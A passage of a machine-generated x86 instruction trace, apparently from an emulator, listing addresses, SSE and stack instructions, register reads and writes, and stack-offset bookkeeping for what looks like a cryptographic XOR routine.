movaps xmmword ptr [ebp - 0x50], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 16 0x41d2c6: mov eax, dword ptr [ebp - 0x15c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 0x41d2cf: movaps xmm1, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41d2de: mov eax, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41d2e4: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x41d2f0: mov edi, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [23] 0x41d2f3: mov ecx, eax, regs_read: [19], regs_write: [22] 0x41d2f5: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41d301: mov eax, dword ptr [ebp - 0x16c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7e94 for stack size 0x10000 0x41d307: mov edi, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41d318: mov dword ptr [ebp - 0x134], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 saving data to stack: 1 4 0x41d320: mov eax, 0x30, regs_read: (), regs_write: [19] 0x41d325: mov dword ptr [ebp - 0x164], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e9c for stack size 0x10000 saving data to stack: 0 4 0x41d331: mov dword ptr [ebp - 0x15c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 saving data to stack: 48 4 0x41d340: movaps xmm3, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [125] 0x41d34a: movaps xmm0, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41d351: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x41d35c: movaps xmm2, xmm3, regs_read: [125], regs_write: [124] 0x41d364: mov eax, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed0 for stack size 0x10000 0x41d375: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x41d37c: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41d384: movaps xmm1, xmm3, regs_read: [125], regs_write: [123] 0x41d387: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x41d392: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x41d3a1: movaps xmmword ptr [ebp - 0x100], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 16 0x41d3a8: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41d3b0: movaps xmmword ptr [ebp - 0xf0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 16 0x41d3b7: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41d3ce: pxor xmm3, xmmword ptr [eax], regs_read: [125, 19], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d3d2: movaps xmmword ptr [ebp - 0x190], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x41d3d9: movaps xmm7, xmm3, regs_read: [125], regs_write: [129] 0x41d3dc: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41d3df: movaps xmm5, xmm3, regs_read: [125], regs_write: [127] 0x41d3ee: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d3f2: movaps xmm6, xmm3, regs_read: [125], regs_write: [128] 0x41d3f5: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41d404: pxor xmm5, xmm0, regs_read: [127, 122], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d408: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41d417: pxor xmm0, xmm1, regs_read: [122, 123], regs_write: [122] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d42e: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d432: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d443: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41d446: movaps xmm4, xmm0, regs_read: [122], regs_write: [126] 0x41d44f: pxor xmm2, xmm7, regs_read: [124, 129], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d453: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41d461: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x41d470: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d474: pxor xmm2, xmm6, regs_read: [124, 128], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d487: pxor xmm4, xmm5, regs_read: [126, 127], regs_write: [126] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d492: movaps xmm3, xmm6, regs_read: [128], regs_write: [125] 0x41d495: movaps xmm0, xmm6, regs_read: [128], regs_write: [122] 0x41d4a4: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d4a8: movaps xmm1, xmm6, regs_read: [128], regs_write: [123] 0x41d4ab: pxor xmm3, xmm2, regs_read: [125, 124], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d4b5: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41d4b8: pxor xmm1, xmm4, regs_read: [123, 126], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d4c1: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d4c5: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41d4d7: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d4e6: pxor xmm6, xmmword ptr [ebp - 0x1e0], regs_read: [128, 20], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x7e20 for stack size 0x10000 0x41d4f4: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41d506: pxor xmm6, xmm3, regs_read: [128, 125], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d50a: mov dword ptr [ebp - 0x128], 4, regs_read: [20], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 4 4 0x41d514: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d518: pxor xmm6, xmm1, regs_read: [128, 123], regs_write: [128] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d523: mov eax, ecx, regs_read: [22], regs_write: [19] 0x41d525: pxor xmm1, xmmword ptr [edi], regs_read: [123, 23], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d529: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41d54a: mov eax, dword ptr [ebp - 0x134], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 0x41d553: mov ecx, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41d559: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d56d: mov edi, dword ptr [ebp - 0x164], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7e9c for stack size 0x10000 0x41d573: mov edx, dword ptr [ebp - 0x138], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 0x41d57c: mov eax, dword ptr [ebp - 0x15c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 0x41d587: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x41d58d: mov dword ptr [ebp - 0x164], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e9c for stack size 0x10000 saving data to stack: 0 4 0x41d59c: mov edi, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41d5a6: mov dword ptr [ebp - 0x134], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 saving data to stack: 48 4 0x41d5ac: mov ecx, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [22] 0x41d5ba: mov eax, 0x20, regs_read: (), regs_write: [19] 0x41d5c3: mov dword ptr [ebp - 0x15c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 saving data to stack: 32 4 0x41d5d0: movaps xmm7, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [129] 0x41d5d7: movaps xmm0, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41d5e4: movaps xmm1, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [123] 0x41d5f6: mov eax, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed0 for stack size 0x10000 0x41d601: mov dword ptr [ebp - 0x128], 2, regs_read: [20], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 2 4 0x41d619: movaps xmmword ptr [ebp - 0x120], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 16 0x41d620: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x41d631: pxor xmm5, xmmword ptr [eax], regs_read: [127, 19], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d63e: movaps xmmword ptr [ebp - 0x110], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 16 0x41d645: movaps xmm0, xmmword ptr [0x4c9b30], regs_read: (), regs_write: [122] 0x41d64c: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x41d653: movaps xmm1, xmm5, regs_read: [127], regs_write: [123] 0x41d656: movaps xmmword ptr [ebp - 0x190], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x41d65d: movaps xmm0, xmm7, regs_read: [129], regs_write: [122] 0x41d66c: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d670: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x41d67f: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d683: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x41d686: pxor xmm3, xmm1, regs_read: [125, 123], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d68a: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x41d699: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d69d: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41d6a5: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d6ae: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41d6c0: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d6d0: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41d6e2: pxor xmm7, xmm5, regs_read: [129, 127], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d6e6: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d6ea: pxor xmm7, xmm3, regs_read: [129, 125], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d6ee: pxor xmm7, xmm1, regs_read: [129, 123], regs_write: [129] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d703: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41d708: pxor xmm1, xmmword ptr [edi], regs_read: [123, 23], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d70c: mov eax, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41d72c: mov eax, dword ptr [ebp - 0x134], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 0x41d735: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d749: mov eax, dword ptr [ebp - 0x15c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 0x41d758: mov ecx, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [22] 0x41d763: mov edx, dword ptr [ebp - 0x138], regs_read: [20], regs_write: [24] adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 0x41d769: movaps xmm6, xmmword ptr [0x4c8bb0], regs_read: (), regs_write: [128] 0x41d77b: mov edi, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41d781: mov eax, 0x10, regs_read: (), regs_write: [19] 0x41d786: movaps xmm7, xmmword ptr [0x4c9b40], regs_read: (), regs_write: [129] 0x41d78f: mov dword ptr [ebp - 0x15c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 saving data to stack: 16 4 0x41d798: mov edi, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41d79e: mov dword ptr [ebp - 0x128], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 13 4 0x41d7b3: mov eax, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed0 for stack size 0x10000 0x41d7b9: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41d7ca: pxor xmm5, xmmword ptr [eax], regs_read: [127, 19], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d7ce: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x41d7d1: movaps xmm0, xmm5, regs_read: [127], regs_write: [122] 0x41d7e0: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d7e4: movaps xmm2, xmm5, regs_read: [127], regs_write: [124] 0x41d7ed: movaps xmm0, xmm3, regs_read: [125], regs_write: [122] 0x41d7fa: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d7fe: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41d80c: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d810: movaps xmm2, xmm1, regs_read: [123], regs_write: [124] 0x41d824: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d828: pxor xmm5, xmm3, regs_read: [127, 125], regs_write: [127] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d82c: pxor xmm2, xmm5, regs_read: [124, 127], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d833: mov eax, edi, regs_read: [23], regs_write: [19] 0x41d835: movaps xmm2, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [124] adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 0x41d83c: movaps xmm1, xmm2, regs_read: [124], regs_write: [123] 0x41d844: pxor xmm1, xmmword ptr [esi], regs_read: [123, 29], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d85e: mov ecx, dword ptr [ebp - 0x128], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 0x41d867: mov eax, dword ptr [ebp - 0x134], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ecc for stack size 0x10000 0x41d881: movaps xmmword ptr [ebp - 0x190], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e70 for stack size 0x10000 saving data to stack: 0 16 0x41d888: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d890: mov eax, dword ptr [ebp - 0x15c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 0x41d89b: mov dword ptr [ebp - 0x128], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 13 4 0x41d8aa: mov dword ptr [ebp - 0x138], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x41d8b2: mov edi, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x138 and offset 0x7edc for stack size 0x10000 0x41d8b8: mov eax, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [19] 0x41d8bb: mov dword ptr [ebp - 0x15c], 0, regs_read: [20], regs_write: () adjusting stack for ESP -0x138 and offset 0x7ea4 for stack size 0x10000 saving data to stack: 0 4 0x41d8d4: mov eax, dword ptr [ebp - 0x170], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7e90 for stack size 0x10000 0x41d8e1: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41d8f4: mov eax, dword ptr [ebp - 0x194], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7e6c for stack size 0x10000 0x41d907: mov dword ptr [eax + 0xc], 0x1000000, regs_read: [19], regs_write: () 0x41d911: mov eax, edi, regs_read: [23], regs_write: [19] 0x41d913: movaps xmmword ptr [ebp - 0x1e0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0x138 and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x41d91a: pxor xmm0, xmmword ptr [esi], regs_read: [122, 29], regs_write: [122] adjusting stack for ESP -0x138 and offset 0x8000 for stack size 0x10000 0x41d92e: mov eax, dword ptr [ebp - 0x198], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7e68 for stack size 0x10000 0x41d934: mov ecx, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [22] 0x41d945: mov dword ptr [ebx + 0x1c], ecx, regs_read: [21, 22], regs_write: () 0x41d954: mov eax, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x138 and offset 0x7ed4 for stack size 0x10000 0x41d95c: push ecx, regs_read: [30, 22], regs_write: [30] 0x41d95d: push eax, regs_read: [30, 19], regs_write: [30] 0x41d961: push eax, regs_read: [30, 19], regs_write: [30] 0x41d967: mov eax, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [19] 0x41d97b: mov byte ptr [ebp + eax - 0x40], 0, regs_read: [20, 19], regs_write: () 0x41d986: movaps xmm0, xmmword ptr [ebp - 0x1e0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x144 and offset 0x7e20 for stack size 0x10000 0x41d990: push 0x20, regs_read: [30], regs_write: [30] 0x41d992: push eax, regs_read: [30, 19], regs_write: [30] 0x41d993: push dword ptr [ebp - 0x130], regs_read: [30, 20], regs_write: [30] 0x41d99d: push esi, regs_read: [30, 29], regs_write: [30] 0x41d9a3: movaps xmm0, xmmword ptr [ebp - 0x190], regs_read: [20], regs_write: [122] adjusting stack for ESP -0x154 and offset 0x7e70 for stack size 0x10000 0x41d9b6: mov eax, 0xd, regs_read: (), regs_write: [19] 0x41d9bb: pxor xmm0, xmmword ptr [esi], regs_read: [122, 29], regs_write: [122] adjusting stack for ESP -0x154 and offset 0x8000 for stack size 0x10000 0x41d9d7: pxor xmm0, xmmword ptr [ebp - 0x40], regs_read: [122, 20], regs_write: [122] adjusting stack for ESP -0x154 and offset 0x7fc0 for stack size 0x10000 0x41d9dc: mov ecx, dword ptr [ebx + 0x1c], regs_read: [21], regs_write: [22] 0x41d9e7: mov eax, dword ptr [ebp - 0x138], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x154 and offset 0x7ec8 for stack size 0x10000 0x41d9f3: push ecx, regs_read: [30, 22], regs_write: [30] 0x41d9f7: push ecx, regs_read: [30, 22], regs_write: [30] 0x41d9f8: push eax, regs_read: [30, 19], regs_write: [30] 0x41da03: push 0x10, regs_read: [30], regs_write: [30] 0x41da08: push eax, regs_read: [30, 19], regs_write: [30] 0x41da09: push dword ptr [ebp - 0x130], regs_read: [30, 20], regs_write: [30] 0x41da13: push esi, regs_read: [30, 29], regs_write: [30] 0x41da1c: mov eax, dword ptr [ebp - 0x130], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x170 and offset 0x7ed0 for stack size 0x10000 0x41da22: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x170 and offset 0x7ffc for stack size 0x10000 0x41da25: pop edi, regs_read: [30], regs_write: [30, 23] 0x41da2b: mov eax, dword ptr [ebp - 0x198], regs_read: [20], regs_write: [19] adjusting stack for ESP -0x16c and offset 0x7e68 for stack size 0x10000 0x41da3a: pop esi, regs_read: [30], regs_write: [30, 29] 0x41da3e: pxor xmm1, xmm0, regs_read: [123, 122], regs_write: [123] adjusting stack for ESP -0x168 and offset 0x8000 for stack size 0x10000 0x41da4a: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x168 and offset 0x8000 for stack size 0x10000 0x41da4c: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41da4d: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41da4f: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41da60: push ebx, regs_read: [30, 21], regs_write: [30] 0x41da61: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x41da6c: push ebp, regs_read: [30, 20], regs_write: [30] 0x41da6d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x41da70: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x41da74: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41da79: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41da80: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41da83: mov edx, dword ptr [ebx + 8], regs_read: [21], regs_write: [24] 0x41da86: mov ecx, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [22] 0x41da94: pxor xmm0, xmmword ptr [edx], regs_read: [122, 24], regs_write: [122] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41da98: mov ecx, 0xd, regs_read: (), regs_write: [22] 0x41dabd: push 0xe, regs_read: [30], regs_write: [30] 0x41dacb: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x4 and offset 0x7ffc for stack size 0x10000 0x41dad7: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x41dad9: pop ebp, regs_read: [30], regs_write: [30, 20] 0x41dada: mov esp, ebx, regs_read: [21], regs_write: [30] 0x41dadc: pop ebx, regs_read: [30], regs_write: [30, 21] 0x41dae0: push ebx, regs_read: [30, 21], regs_write: [30] 0x41dae1: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x4 and offset 0x8000 for stack size 0x10000 0x41daec: push ebp, regs_read: [30, 20], regs_write: [30] 0x41daed: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x41daf0: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP 0x0 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x41daf4: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x41dafc: mov eax, dword ptr [0x4eb04c], regs_read: (), regs_write: [19] 0x41db03: mov dword ptr [ebp - 4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 4 0x41db06: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x41db09: mov edx, dword ptr [ebx + 8], regs_read: [21], regs_write: [24] 0x41db0c: mov ecx, dword ptr [ebx + 0x14], regs_read: [21], regs_write: [22] 0x41db0f: push esi, regs_read: [30, 29], regs_write: [30] 0x41db10: mov esi, dword ptr [ebx + 0x2c], regs_read: [21], regs_write: [29] 0x41db19: push edi, regs_read: [30, 23], regs_write: [30] 0x41db1a: mov edi, dword ptr [ebx + 0x20], regs_read: [21], regs_write: [23] 0x41db1d: mov dword ptr [ebp - 0x218], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP -0x8 and offset 0x7de8 for stack size 0x10000 saving data to stack: 0 4 0x41db23: mov eax, dword ptr [ebx + 0x30], regs_read: [21], regs_write: [19] 0x41db26: push eax, regs_read: [30, 19], regs_write: [30] 0x41db30: push eax, regs_read: [30, 19], regs_write: [30] 0x41db31: mov dword ptr [ebp - 0x21c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP -0x10 and offset 0x7de4 for stack size 0x10000 saving data to stack: 0 4 0x41db37: mov dword ptr [ebp - 0x214], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0x10 and offset 0x7dec for stack size 0x10000 saving data to stack: 0 4 0x41db48: push eax, regs_read: [30, 19], regs_write: [30] 0x41db49: push esi, regs_read: [30, 29], regs_write: [30] 0x41db4a: push dword ptr [ebx + 0x28], regs_read: [30, 21], regs_write: [30] 0x41db4d: push dword ptr [ebx + 0x24], regs_read: [30, 21], regs_write: [30] 0x41db50: push edi, regs_read: [30, 23], regs_write: [30] 0x41db51: push dword ptr [ebx + 0x1c], regs_read: [30, 21], regs_write: [30] 0x41db54: push dword ptr [ebx + 0x18], regs_read: [30, 21], regs_write: [30] 0x41db57: push dword ptr [ebp - 0x214], regs_read: [30, 20], regs_write: [30] 0x41db5d: push dword ptr [ebx + 0x10], regs_read: [30, 21], regs_write: [30] 0x41db60: push dword ptr [ebp - 0x218], regs_read: [30, 20], regs_write: [30] 0x41db66: push dword ptr [ebp - 0x21c], regs_read: [30, 20], regs_write: [30] 0x41db71: mov esi, eax, regs_read: [19], regs_write: [29] 0x41db79: push 0x200, regs_read: [30], regs_write: [30] 0x41db7e: push eax, regs_read: [30, 19], regs_write: [30] 0x41db84: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP -0x44 and offset 0x7ffc for stack size 0x10000 0x41db8a: mov eax, esi, regs_read: [29], regs_write: [19] 0x41db8e: pop edi, regs_read: [30], regs_write: [30, 23] 0x41db8f: pop esi, regs_read: [30], regs_write: [30, 29] 0x41db95: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x3c and offset 